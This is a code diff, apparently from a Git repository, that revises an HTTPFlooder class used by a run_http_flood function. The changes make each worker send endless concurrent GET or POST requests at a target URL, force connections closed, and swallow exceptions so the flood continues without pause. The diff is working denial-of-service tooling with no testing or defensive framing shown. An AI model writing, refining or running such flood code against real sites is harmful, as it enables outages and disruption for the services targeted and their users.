@@ -45,14 +45,18 @@ class HTTPFlooder:
 
         log.critical(f"Size headers: {sys.getsizeof(str(headers))} bytes")
 
-        time.sleep(2)
+        # time.sleep(2)
+        await asyncio.sleep(2)
         connector = TCPConnector(
             limit=self.concurrency * 2,
             limit_per_host=self.concurrency,
             ssl=self.ssl_context,
             use_dns_cache=True,
             ttl_dns_cache=30,
-            keepalive_timeout=30,
+            
+            force_close=True,
+            enable_cleanup_closed=True
+            
         )
 
 
@@ -80,64 +84,36 @@ class HTTPFlooder:
     ) -> None:
         pid = os.getpid()
 
+        method_name =  self.method.lower()
+        method_func = getattr(self.session, method_name)
+        worker_label = f"[Worker '{method_name}' {worker_id} | PID {pid}]"
+
         while True:
             async with sem:
                 try:
+                    if self.sleep_time > 0:
+                        await asyncio.sleep(self.sleep_time)
                     if not self.session:
                         raise RuntimeError("HTTP session is not initialized.")      
                     
+                    
+                    async with method_func(
+                            self.target_url, 
+                            timeout=10,
+                            ssl=self.ssl_context
+                    ) as response:
+                        await response.release()
+                        status = response.status
 
-                    log.warning(f"Method: {self.method.upper()}")
-                    time.sleep(5)
-                    if self.method == 'get':
-                        async with self.session.get(
-                            self.target_url
-                        ) as response:
-                            await response.read()
-                            
-
-                            success = 0
-                            error = 0
-
-                            if response.status >= 400:
-                                error += 1
-                            else:
-                                success += 1
-
-                            # message = f"{success} successfully | {error} errors"
-                            print(f"[Worker 'get' {worker_id} | PID {pid}]  {success} successfully | {error} errors. {response.status}")
-                            # print(message)
-                    else:
-                        async with self.session.post(
-                            self.target_url
-                        ) as response:
-                            await response.read()
-                            
-
-                            success = 0
-                            error = 0
-
-                            if response.status >= 400:
-                                error += 1
-                            else:
-                                success += 1
-
-                            # message = f"{success} successfully | {error} errors"
-                            print(f"[Worker 'post' {worker_id} | PID {pid}]  {success} successfully | {error} errors. {response.status}")
-                            # print(message)
-                        if self.sleep_time >0:
-                            await asyncio.sleep(self.sleep_time)
+                        if status >= 400:
+                            print(f"{worker_label} Error: {status}")
 
                 except asyncio.CancelledError:
-                #     log.info(f"[Worker {worker_id} | PID {pid}] Task was cancelled.")
-                #     break
-                # except Exception as e:
-                #     log.error(f"[Worker {worker_id} | PID {pid}] Error sending HTTP request: {e}")
-                #     await asyncio.sleep(
-                #         min(5, self.sleep_time +1)
-                #     )
-                    pass
-
+                    break
+                except Exception as e:
+        
+                    await asyncio.sleep(1)
+                    continue
 
 async def run_http_flood(
         target_url: str,
